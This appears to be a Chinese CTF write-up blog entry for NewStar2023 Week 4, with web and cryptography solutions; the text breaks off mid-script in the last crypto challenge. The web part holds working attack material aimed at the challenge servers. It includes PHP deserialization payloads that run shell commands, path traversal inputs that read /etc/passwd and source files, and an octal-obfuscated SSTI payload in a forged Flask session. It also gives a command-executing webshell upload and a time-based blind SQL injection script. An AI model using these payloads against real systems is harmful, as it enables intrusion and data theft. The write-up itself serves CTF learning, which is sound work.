[{"title":"NewStar2023 Week4","url":"/NewStar2023-WriteUp-Week4/","content":"\n## week4\n\n### web\n\n#### 逃\n\n题目：\n\n```php\n <?php\nhighlight_file(__FILE__);\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key;\n    public $cmd = \"whoami\";\n    public function __construct($key)\n    {\n        $this->key = $key;\n    }\n    public function __destruct()\n    {\n        system($this->cmd);\n    }\n}\n\nunserialize(waf(serialize(new GetFlag($_GET['key'])))); www-data www-data \n```\n\n**经典的php反序列化字符逃逸**\n\n首先构造序列化代码：\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key='bad';   \n    public $cmd = \"ls /\";\n}\n\n$a = new GetFlag();\necho serialize($a).\"\\n\";\n```\n\n`O:7:\"GetFlag\":2:{s:3:\"key\";s:3:\"bad\";s:3:\"cmd\";s:4:\"ls /\";}`\n\n我们需要逃逸的是`\";s:3:\"cmd\";s:4:\"ls /\";}`\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key='\";s:3:\"cmd\";s:4:\"ls /\";}';  \n    public $cmd = \"ls /\";\n}\n\n$a = new GetFlag();\necho serialize($a).\"\\n\";\n```\n\n\n\n`O:7:\"GetFlag\":2:{s:3:\"key\";s:24:\"\";s:3:\"cmd\";s:4:\"ls /\";}\";s:3:\"cmd\";s:4:\"ls /\";}`\n\n总共24个字符，于是我们写24个bad就行\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key='badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:4:\"ls /\";}';  \n    public $cmd = \"ls /\";\n}\n\n$a = new GetFlag();\necho serialize($a).\"\\n\";\n\n$res = waf(serialize($a));\necho $res.\"\\n\";\n\n$c = unserialize($res);\nprint_r($c).\"\\n\";\necho $c->cmd;\n```\n\n运行结果：\n\n```php\nO:7:\"GetFlag\":2:{s:3:\"key\";s:96:\"badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:4:\"ls /\";}\";s:3:\"cmd\";s:4:\"ls /\";}\nO:7:\"GetFlag\":2:{s:3:\"key\";s:96:\"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\";s:3:\"cmd\";s:4:\"ls /\";}\";s:3:\"cmd\";s:4:\"ls /\";}\nGetFlag Object\n(\n    [key] => goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\n    [cmd] => ls /\n)\nls /\n```\n\npayload：\n\n`key = badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:4:\"ls /\";}\" `\n\n![image-20231030150507471](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231030150507471.png)\n\n接着构造payload查看flag\n\n`/?key=.badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:9:\"cat /flag\";}`\n\n![image-20231030150810755](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231030150810755.png)\n\n#### More Fast\n\n题目：\n\n```php\n <?php\nhighlight_file(__FILE__);\n\nclass Start{\n    public $errMsg;\n    public function __destruct() {\n        die($this->errMsg);\n    }\n}\n\nclass Pwn{\n    public $obj;\n    public function __invoke(){\n        $this->obj->evil();\n    }\n    public function evil() {\n        phpinfo();\n    }\n}\n\nclass Reverse{\n    public $func;\n    public function __get($var) {\n        ($this->func)();\n    }\n}\n\nclass Web{\n    public $func;\n    public $var;\n    public function evil() {\n        if(!preg_match(\"/flag/i\",$this->var)){\n            ($this->func)($this->var);\n        }else{\n            echo \"Not Flag\";\n        }\n    }\n}\n\nclass Crypto{\n    public $obj;\n    public function __toString() {\n        $wel = $this->obj->good;\n        return \"NewStar\";\n    }\n}\n\nclass Misc{\n    public function evil() {\n        echo \"good job but nothing\";\n    }\n}\n\n$a = @unserialize($_POST['fast']);\nthrow new Exception(\"Nope\");\nFatal error: Uncaught Exception: Nope in /var/www/html/index.php:55 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 55\n\n```\n\n首先就是构造pop链：\n\n>//目的是触发Web中的evil函数 执行 system (cat /f*)\n>\n>//需要触发Web->evil()函数 就需要触发Pwn中的__invoke()方法\n>\n>//需要触发Pwn中的\\__invoke()方法 就需要触发Reverse中的__get()方法 --> 调用不存在的成员属性 \n>\n>//需要触发Reverse中的\\__get()方法  就需要触发Crypto中的__toString()方法 --> 被当成一个对象时调用\n>\n>//需要触发Crypto中的\\__toString()方法 就需要通过start中的__destruct()方法\n\n所以完整的pop链：**\\_\\_destruct()->\\_\\_toString()->\\__get($var)->\\_\\_invoke()->Web**\n\n构造poc：\n\n```php\n<?php\nclass Start{\n    public $errMsg;\n}\n\nclass Pwn{\n    public $obj;\n\n}\n\nclass Reverse{\n    public $func;\n\n}\n\nclass Web{\n    public $func = \"system\";\n    public $var = \"cat /f*\";\n}\n\nclass Crypto{\n    public $obj;\n\n}\n\n$a = new Start();\n$a->errMsg = new Crypto();\n$b = $a->errMsg;\n$b->obj = new Reverse();\n$c = $b->obj;\n$c->func = new Pwn();\n$d = $c->func;\n$d->obj = new Web();\necho serialize($a);\n```\n\n`O:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:7:\"cat /f*\";}}}}}`\n\n根据题目提示以及源代码中出现`throw new Exception(\"Nope\");`\n\n这会导致反序列化之后直接经过异常报错，导致后面的__destruct() 无法触发\n\n> **快速触发destruct**\n>\n> 1. 修改序列化数字的个数\n>\n>    原paylaod：O:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:7:\"cat /f*\";}}}}}\n>\n>    现payload：O:5:\"Start\":**2**:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:7:\"cat /f*\";}}}}}\n>\n> 2. 去掉序列化尾部(去掉生成的序列化字符串最后的一个大括号)\n>\n>    O:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:7:\"cat /f*\";}}}}\n\n\n\n知识点：\n\n1. PHP中，如果单独执行unserialize函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。\n\n2. PHP中，如果用一个变量接住反序列化函数的返回值，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，那么在PHP脚本走完流程之后，这个对象才会被销毁，在有析构函数的情况下就会将其执行。\n\n#### InjectMe\n\n**考点**：目录穿越+session伪造+SSTI bypass\n\ndockerfile:\n\n```bash\nFROM vulhub/flask:1.1.1\nENV FLAG=flag{not_here}\nCOPY src/ /app\nRUN mv /app/start.sh /start.sh && chmod 777 /start.sh\nCMD [ \"/start.sh\" ]\nEXPOSE 8080\n```\n\n根据题目提示`穿越我的秘密，狠狠地注入！`以及打开题目点击图片，点到110.jpg发现 是python的flask框架\n\n![image-20231102152240462](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231102152240462.png)\n\n猜测可能是`目录穿越`，由于写到将“../”替换成“”，于是构造`..././..././..././..././etc/passwd`-->`../../../../etc/passwd`  或者 `....//....//....//....//etc/passwd`\n\n下载文件得到：\n\n```bash\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n```\n\n没有发现有用信息，接着找到dockerfile文件中存在app目录，于是猜测服务器运行代码app.py代码存在其中，访问下载 `....//....//....//....//app/app.py`\n\n```python\nimport os\nimport re\n\nfrom flask import Flask, render_template, request, abort, send_file, session, render_template_string\nfrom config import secret_key\n\napp = Flask(__name__)\napp.secret_key = secret_key\n\n\n@app.route('/')\ndef hello_world():  # put application's code here\n    return render_template('index.html')\n\n\n@app.route(\"/cancanneed\", methods=[\"GET\"])\ndef cancanneed():\n    all_filename = os.listdir('./static/img/')\n    filename = request.args.get('file', '')\n    if filename:\n        return render_template('img.html', filename=filename, all_filename=all_filename)\n    else:\n        return f\"{str(os.listdir('./static/img/'))} <br> <a href=\\\"/cancanneed?file=1.jpg\\\">/cancanneed?file=1.jpg</a>\"\n\n\n@app.route(\"/download\", methods=[\"GET\"])\ndef download():\n    filename = request.args.get('file', '')\n    if filename:\n        filename = filename.replace('../', '')\n        filename = os.path.join('static/img/', filename)\n        print(filename)\n        if (os.path.exists(filename)) and (\"start\" not in filename):\n            return send_file(filename)\n        else:\n            abort(500)\n    else:\n        abort(404)\n\n\n@app.route('/backdoor', methods=[\"GET\"])\ndef backdoor():\n    try:\n        print(session.get(\"user\"))\n        if session.get(\"user\") is None:\n            session['user'] = \"guest\"\n        name = session.get(\"user\")\n        if re.findall(\n                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\\+|request|cat|tac|base64|nl|hex|\\\\u|\\\\x|\\.',\n                name):\n            abort(500)\n        else:\n            return render_template_string(\n                '竟然给<h1>%s</h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 <br> 那么 现在轮到你了!<br> 最后祝您玩得愉快!😁' % name)\n    except Exception:\n        abort(500)\n\n\n@app.errorhandler(404)\ndef page_not_find(e):\n    return render_template('404.html'), 404\n\n\n@app.errorhandler(500)\ndef internal_server_error(e):\n    return render_template('500.html'), 500\n\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=8080)\n\n```\n\n审计源码发现：`from config import secret_key` 以及`@app.route('/backdoor', methods=[\"GET\"])`\n\n1. `from config import secret_key`，首先根据此猜测可能存在config.py文件，其中存在secret_key\n\n于是访问下载`....//....//....//....//app/config.py`\n\n得到：`secret_key = \"y0u_n3ver_k0nw_s3cret_key_1s_newst4r\"`\n\n2. 伪造seesion，进行模板注入，有关键字过滤，可以使用八进制绕过\n\n官方脚本更改相关信息：\n\n```python\nimport re\nimport requests\nimport subprocess\n\n\n# 把这个下载了，需要使用里面的flask-session-cookie-manager3.py\n# https://github.com/noraj/flask-session-cookie-manager\ndef string_to_octal_ascii(s):\n    octal_ascii = \"\"\n    for char in s:\n        char_code = ord(char)\n        octal_ascii += \"\\\\\\\\\" + format(char_code, '03o')\n    # octal_ascii += \"\\\\\\\\\" + format(char_code, 'o')\n    return octal_ascii\n\n\nsecret_key = \"y0u_n3ver_k0nw_s3cret_key_1s_newst4r\"\n# payload = \"{%print(7*7)%}\"\n# payload = \"{%print(\\\"\\\"\\\\\\\\u005f\\\\\\\\u005f\\\"\\\")%}\"\n# payload = \"{%print(\\\"\\\"\\\\\\\\x5f\\\\\\\\x5f\\\"\\\")%}\"\neval_shell = \"\\\"\\\"\" + string_to_octal_ascii(\"__import__(\\\"os\\\").popen(\\\"cat /*\\\").read()\") + \"\\\"\\\"\"\nprint(eval_shell)\n# docker部署&windows运行payload\n# {{x.__init__.__globals__.__builtins__.eval('__import__(\"os\").popen(\"dir\").read()')}}\npayload = \"{{%print(xxx|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\151\\\\\\\\156\\\\\\\\151\\\\\\\\164\\\\\\\\137\\\\\\\\137\\\"\\\")|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\154\\\\\\\\157\\\\\\\\142\\\\\\\\141\\\\\\\\154\\\\\\\\163\\\\\\\\137\\\\\\\\137\\\"\\\")|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\\"\\\")(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\142\\\\\\\\165\\\\\\\\151\\\\\\\\154\\\\\\\\164\\\\\\\\151\\\\\\\\156\\\\\\\\163\\\\\\\\137\\\\\\\\137\\\"\\\")|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\\"\\\")(\\\"\\\"\\\\\\\\145\\\\\\\\166\\\\\\\\141\\\\\\\\154\\\"\\\")({0}))%}}\".format(eval_shell)\nprint(payload)\ncommand = \"D:\\\\program\\\\python3\\\\python.exe flask_session_cookie_manager3.py encode -s \\\"{0}\\\" -t \\\"{{'user':'{1}'}}\\\"\".format(secret_key, payload)\nprint(command)\nsession_data = subprocess.check_output(command, shell=True)\nprint(session_data)\n# linux和windows换行不一样，linux是去掉最后一个，windows是最后两个。\nsession_data = session_data[:-2].decode('utf-8')\n# session_data = session_data[:-1].decode('utf-8')\nprint(session_data)\nurl = \"http://0b401771-d36b-47ca-8971-2b9dedf4b9e0.node4.buuoj.cn:81/backdoor\"\ncookies = {\"session\": session_data}\nres = requests.get(url=url, cookies=cookies)\n# print(res.text)\npattern = r'<h1>(.*)</h1>'\nresult_content = re.search(pattern, res.text, re.S)\n# print(result_content)\nif result_content:\n    result = result_content.group(1)\n    print(result)\nelse:\n    print(\"something wrong!\")\n\n```\n\n#### flask disk\n\n点开题目出现 `list file`、`upload files`、`admin manage`\n\n依次点击，到`admin manage`出现\n\n![image-20231103153932670](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231103153932670.png)\n\n这能得到是python flask框架，说明flask开启了debug模式，在debug模式下app.py源文件被修改后会立刻加载，只需上传一个能rce的app.py文件把原来的覆盖\n\n```python\nfrom flask import Flask,request\nimport os\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    try:\n        cmd = request.args.get('cmd')\n        date = os.popen(cmd).read()\n        return date\n    except:\n        pass\n\n    return \"1\"\nif __name__ == '__main__':\n    app.run(host='0.0.0.0',port=5000,debug=True)\n```\n\n\n\n> from flask import Flask, request：导入了Flask框架以及request模块，用于创建Web应用程序和处理HTTP请求。\n>\n> import os：导入了Python的os模块，用于执行操作系统命令。\n>\n> app = Flask(\\__name__)：创建一个Flask应用程序实例。\n>\n> @app.route('/')：定义了一个路由，当用户访问根路径('/')时，将执行下面的index函数。\n>\n> def index()：定义了一个名为index的函数，用于处理用户的HTTP请求。\n>\n> cmd = request.args.get('cmd')：从HTTP请求的查询参数中获取名为'cmd'的参数的值，该值应该包含一个要执行的操作系统命令。\n>\n> date = os.popen(cmd).read()：使用os.popen执行获取到的命令，并将执行结果存储在date变量中。\n>\n> return date：将命令执行结果返回给客户端，这意味着如果用户提供了合法的操作系统命令，服务器将执行该命令并返回结果。return \"1\"：如果没有提供'cmd'参数或发生异常，服务器将返回字符串\"1\"。\n\n接着访问：`http://f003e914-33c2-4635-9170-1b7cb9c5f4a8.node4.buuoj.cn:81/?cmd=ls%20/`\n\n`http://f003e914-33c2-4635-9170-1b7cb9c5f4a8.node4.buuoj.cn:81/?cmd=cat%20/flag`\n\n#### midsql\n\n考察sql时间盲注，过滤了空格，无回显\n\n```python\nimport time\nimport requests\n\nresult = ''\nlast = ' '\n\nfor i in range(1, 1000):\n    for j in range(127, 31, -1):\n        url = 'http://3498ba56-0b4f-4a64-b19a-4ef45047e7df.node4.buuoj.cn:81/?id='\n        # payload = f'1/**/and/**/if((ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),{i},1))>{j}),sleep(3),0)' # information_schema,mysql,performance_schema,sys,test,ctf\n        # payload = f'1/**/and/**/if((ascii(substr((select/**/database()),{i},1))>{j}),sleep(3),0)'\n        # payload = f'1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/\"ctf\"),{i},1))>{j}),sleep(3),0)'\n        # payload = f'1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/\"items\"),{i},1))>{j}),sleep(3),0)' # id,name,price\n        # payload = f'1/**/and/**/if((ascii(substr((select/**/group_concat(price)/**/from/**/ctf.items),{i},1))>{j}),sleep(3),0)'\n        # payload = f'1/**/and/**/if((ascii(substr((select/**/group_concat(id,0x3a,name,0x3a,price)/**/from/**/ctf.items),{i},1))>{j}),sleep(3),0)'\n        payload = f'1/**/and/**/if((ascii(substr((select/**/group_concat(name)/**/from/**/ctf.items),{i},1))>{j}),sleep(4),0)'\n        url = url + payload\n        # print(url)\n        start_time = time.time()\n        response = requests.get(url=url)\n        end_time = time.time()\n        if (end_time - start_time) >3:\n            last = result\n            result += chr(j + 1)\n            break\n    print(result)\n```\n\n\n\n### crypto \n\n#### RSA Variation II\n\n题目：\n\n```python\nfrom secret import flag\nfrom Crypto.Util.number import *\n\np = getPrime(1024)\nq = getPrime(1024)\n\nN = p*p*q\n\nd= inverse(N, (p-1)*(q-1)//GCD(p-1, q-1))\n\nm = bytes_to_long(flag)\n\nc = pow(m, N, N)\n\nprint('c =', c)\nprint('N =', N)\nprint('d =', d)\n\n# c = 1653396627113549535760516503668455111392369905404419847336187180051939350514408518095369852411718553340156505246372037811032919080426885042549723125598742783778413642221563616358386699697645814225855089454045984443096447166740882693228043505960011332616740785976743150624114653594631779427044055729185392854961786323215146318588164139423925400772680226861699990332420246447180631417523181196631188540323779487858453719444807515638025771586275969579201806909799448813112034867089866513864971414742370516244653259347267231436131850871346106316007958256749016599758599549180907260093080500469394473142003147643172770078092713912200110043214435078277125844112816260967490086038358669788006182833272351526796228536135638071670829206746835346784997437044707950580087067666459222916040902038574157577881880027391425763503693184264104932693985833980182986816664377018507487697769866530103927375926578569947076633923873193100147751463\n# N = 1768427447158131856514034889456397424027937796617829756303525705316152314769129050888899742667986532346611229157207778487065194513722005516611969754197481310330149721054855689646133721600838194741123290410384315980339516947257172981002480414254023253269098539962527834174781356657779988761754582343096332391763560921491414520707112852896782970123018263505426447126195645371941116395659369152654368118569516482251442513192892626222576419747048343942947570016045016127917578272819812760632788343321742583353340158009324794626006731057267603803701663256706597904789047060978427573361035171008822467120148227698893238773305320215769410594974360573727150122036666987718934166622785421464647946084162895084248352643721808444370307254417501852264572985908550839933862563001186477021313236113690793843893640190378131373214104044465633483953616402680853776480712599669132572907096151664916118185486737463253559093537311036517461749439\n# d = 20650646933118544225095544552373007455928574480175801658168105227037950105642248948645762488881219576174131624593293487325329703919313156659700002234392400636474610143032745113473842675857323774566945229148664969659797779146488402588937762391470971617163496433008501858907585683428652637958844902909796849080799141999490231877378863244093900363251415972834146031490928923962271054053278056347181254936750536280638321211545167520935870220829786490686826062142415755063724639110568511969041175019898031990455911525941036727091961083201123910761290998968240338217895275414072475701909497518616112236380389851984377079\n```\n\n根据题目提示Schmidt-Samoa密码\n\n1. **Schmidt-Samoa密码系统**\n\nSchmidt-Samoa密码系统，像rabin加密一样，其安全性基于整数因式分解的难度。但 Rabin 解密时会得到四个解，而 Schmidt-Samor 得到的是唯一解。\n\n2. **密钥生成**\n\n​       1.选取两个大的质数p和q并进行计算 N = p^2^q \n\n​       2.计算 d = invert (N , φ (pq)) \n\n3. **加密**\n\n对消息m，计算密文 C = m^N^  mod N\n\n4. **解密**\n\n计算明文 m = C^d^  mod  pq\n\n举例：\n\n>- p=7, q=11,  N=p^2^q=539 ,  d = N ^-1^ mod  lcm ( p − 1 , q − 1 ) = 29 \n>- m = 32 ,  c = m^N^ mod N = 373 \n\n验证：\n\n>m=c^d^  mod pq = 373 ^29^ mod pq = 373^29^ mod 77 = 32\n\n关于获取pq的问题\n\n由 N = p ^2^ ∗ q , d * N = 1 mod (q-1) (p-1)通过欧拉定理可以得到：\n\n>a ^(p1-)(q-1)^ ≡ 1 mod pq\n\n所以：\n\n>a^N^ ∗ d = a^1+k∗(q−1)(p−1)^ ≡ a∗a^k∗(q−1)(p−1)^=a  mod pq \n\n所以：\n\n>k ∗ pq=a^N∗d^ − a\n>pq =  gcd(a^N*d^ - a,N)\n>因为a的取值可以是 a = 2,3,4,5…，这里方便计算我们取 2\n\n解密exp:\n\n```python\nfrom libnum import*\n\nN =  1768427447158131856514034889456397424027937796617829756303525705316152314769129050888899742667986532346611229157207778487065194513722005516611969754197481310330149721054855689646133721600838194741123290410384315980339516947257172981002480414254023253269098539962527834174781356657779988761754582343096332391763560921491414520707112852896782970123018263505426447126195645371941116395659369152654368118569516482251442513192892626222576419747048343942947570016045016127917578272819812760632788343321742583353340158009324794626006731057267603803701663256706597904789047060978427573361035171008822467120148227698893238773305320215769410594974360573727150122036666987718934166622785421464647946084162895084248352643721808444370307254417501852264572985908550839933862563001186477021313236113690793843893640190378131373214104044465633483953616402680853776480712599669132572907096151664916118185486737463253559093537311036517461749439\n#N = p^2*q\nd = 20650646933118544225095544552373007455928574480175801658168105227037950105642248948645762488881219576174131624593293487325329703919313156659700002234392400636474610143032745113473842675857323774566945229148664969659797779146488402588937762391470971617163496433008501858907585683428652637958844902909796849080799141999490231877378863244093900363251415972834146031490928923962271054053278056347181254936750536280638321211545167520935870220829786490686826062142415755063724639110568511969041175019898031990455911525941036727091961083201123910761290998968240338217895275414072475701909497518616112236380389851984377079\nc = 1653396627113549535760516503668455111392369905404419847336187180051939350514408518095369852411718553340156505246372037811032919080426885042549723125598742783778413642221563616358386699697645814225855089454045984443096447166740882693228043505960011332616740785976743150624114653594631779427044055729185392854961786323215146318588164139423925400772680226861699990332420246447180631417523181196631188540323779487858453719444807515638025771586275969579201806909799448813112034867089866513864971414742370516244653259347267231436131850871346106316007958256749016599758599549180907260093080500469394473142003147643172770078092713912200110043214435078277125844112816260967490086038358669788006182833272351526796228536135638071670829206746835346784997437044707950580087067666459222916040902038574157577881880027391425763503693184264104932693985833980182986816664377018507487697769866530103927375926578569947076633923873193100147751463\n\npq = gcd(pow(2,d*N,N)-2,N)\n\nm = pow(c,d,pq)\nprint(n2s(m))\n\n```\n\n#### signin[官方解]\n\n- **考点： p-1光滑，多次rabin** ：\n\n- **FLAG**：flag{new1sstar_welcome_you}\n\n- **解题步骤**\n\n```python\ndef uniPrime(bits):    \n    while True:        \n        n = 2        \n        while n.bit_length() < bits:            \n            n *= choice(sieve_base)        \n        if isPrime(n + 1):            \n            return n + 1\n```\n\n阅读代码可知p-1光滑,可以用如下方式分解\n\n![image-20231106201320077](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231106201320077.png)\n\n再来看e,e=65536*3\n\n可以看作 2**16*3，那么对rabin解密后的结果再次rabin，共16次rabin解密\n\n代码如下：\n\n```python\nfrom Crypto.Util.number import *\nN= 3326716005321175474866311915397401254111950808705576293932345690533263108414883877530294339294274914837424580618375346509555627578734883357652996005817766370804842161603027636393776079113035745495508839749006773483720698066943577445977551268093247748313691392265332970992500440422951173889419377779135952537088733\nc= 2709336316075650177079376244796188132561250459751152184677022745551914544884517324887652368450635995644019212878543745475885906864265559139379903049221765159852922264140740839538366147411533242116915892792672736321879694956051586399594206293685750573633107354109784921229088063124404073840557026747056910514218246\nimport gmpy2\na = 2\nn = 2\nwhile True:\n    a = pow(a, n, N)\n    res = gmpy2.gcd(a-1, N)\n    if res != 1 and res != N:\n        q = N // res\n        p = res\n        break\n    n += 1\nprint(2**16)\ne=65536*3\nn = p*q\nx0=gmpy2.invert(p,q)\nx1=gmpy2.invert(q,p)\ncs = [c]\nfor i in range(16):\n    ps = []\n    for c2 in cs:\n        r = pow(c2, (p + 1) // 4, p)\n        s = pow(c2, (q + 1) // 4, q)\n        x = (r * x1 * q + s * x0 * p) % n\n        y = (r * x1 * q - s * x0 * p) % n\n        if x not in ps:\n            ps.append(x)\n        if n - x not in ps:\n            ps.append(n - x)\n        if y not in ps:\n            ps.append(y)\n        if n - y not in ps:\n            ps.append(n - y)\n    cs = ps\nfor m in ps:\n    flag = long_to_bytes(gmpy2.iroot(m,3)[0])\n    print(flag)\n```\n\n\n\n> 官方WriteUp：https://shimo.im/docs/gXqmdVvbOEsXpo3o/read\n\n#### BabyNRTU[官方解]\n\n- **考点**：NTRU 格攻击在二维的情形\n\n- **FLAG**：flag{Lattice_reduction_magic_on_NTRU#82b08b2d}\n\n- **解题步骤**\n\n```python\nfrom Crypto.Util.number import long_to_bytes\n\n\n# h,q = (8916452722821418463248726825721257021744194286874706915832444631771596616116491775091473142798867278598586482678387668986764461265131119164500473719939894343163496325556340181429675937641495981353857724627081847304246987074303722642172988864138967404024201246050387152854001746763104417773214408906879366958729744259612777257542351501592019483745621824894790096639205771421560295175633152877667720038396154571697861326821483170835238092879747297506606983322890706220824261581533324824858599082611886026668788577757970984892292609271082176311433507931993672945925883985629311514143607457603297458439759594085898425992, 31985842636498685945330905726539498901443694955736332073639744466389039373143618920511122288844282849407290205804991634167816417468703459229138891348115191921395278336695684210437130681337971686008048054340499654721317721241239990701099685207253476642931586563363638141636011941268962999641130263828151538489139254625099330199557503153680089387538863574480134898211311252227463870838947777479309928195791241005127445821671684607237706849308372923372795573732000365072815112119533702614620325238183899266147682193892866330678076925199674554569018103164228278742151778832319406135513140669049734660019551179692615505961)\n# e = 20041713613876382007969284056698149007154248857420752520496829246324512197188211029665990713599667984019715503486507126224558092176392282486689347953069815123212779090783909545244160318938357529307482025697769394114967028564546355310883670462197528011181768588878447856875173263800885048676190978206851268887445527785387532167370943745180538168965461612097037041570912365648125449804109299630958840398397721916860876687808474004391843869813396858468730877627733234832744328768443830669469345926766882446378765847334421595034470639171397587395341977453536859946410431252287203312913117023084978959318406160721042580688\n\"\"\"\nfrom sage.all import *\nfrom Crypto.Util.number import long_to_bytes\nh, q = (8916452722821418463248726825721257021744194286874706915832444631771596616116491775091473142798867278598586482678387668986764461265131119164500473719939894343163496325556340181429675937641495981353857724627081847304246987074303722642172988864138967404024201246050387152854001746763104417773214408906879366958729744259612777257542351501592019483745621824894790096639205771421560295175633152877667720038396154571697861326821483170835238092879747297506606983322890706220824261581533324824858599082611886026668788577757970984892292609271082176311433507931993672945925883985629311514143607457603297458439759594085898425992, 31985842636498685945330905726539498901443694955736332073639744466389039373143618920511122288844282849407290205804991634167816417468703459229138891348115191921395278336695684210437130681337971686008048054340499654721317721241239990701099685207253476642931586563363638141636011941268962999641130263828151538489139254625099330199557503153680089387538863574480134898211311252227463870838947777479309928195791241005127445821671684607237706849308372923372795573732000365072815112119533702614620325238183899266147682193892866330678076925199674554569018103164228278742151778832319406135513140669049734660019551179692615505961)\ne = 20041713613876382007969284056698149007154248857420752520496829246324512197188211029665990713599667984019715503486507126224558092176392282486689347953069815123212779090783909545244160318938357529307482025697769394114967028564546355310883670462197528011181768588878447856875173263800885048676190978206851268887445527785387532167370943745180538168965461612097037041570912365648125449804109299630958840398397721916860876687808474004391843869813396858468730877627733234832744328768443830669469345926766882446378765847334421595034470639171397587395341977453536859946410431252287203312913117023084978959318406160721042580688\nM = Matrix(ZZ, [\n            [1, h],\n            [0, q]\n])\nfor v in M.LLL():\n    f, g = v\n    a = e*f % q\n    m = a * inverse_mod(f, g) % g\n    if b'flag' in long_to_bytes(m):\n        print(long_to_bytes(m)\n\n\"\"\"\nm = 240545625414656445795697416299836828697587638044418742943136404284040669983557024929358783705357829768985339005\nprint(long_to_bytes(m))\n\n```\n\n#### Smart[官方解]\n\n- **考点**：ECC Smart attack（椭圆曲线trace of Frobenius = 1的情形）\n\n- **FLAG**：flag{m1nd_y0ur_p4rameter#167d}\n\n- **解题步骤**.\n\n```python\n\"\"\"\n考点：ECC Smart attack（椭圆曲线trace of Frobenius = 1的情形）\nFLAG：flag{m1nd_y0ur_p4rameter#167d}\n# 解题步骤\n\"\"\"\n\nfrom Crypto.Util.number import *\nfrom sage.all 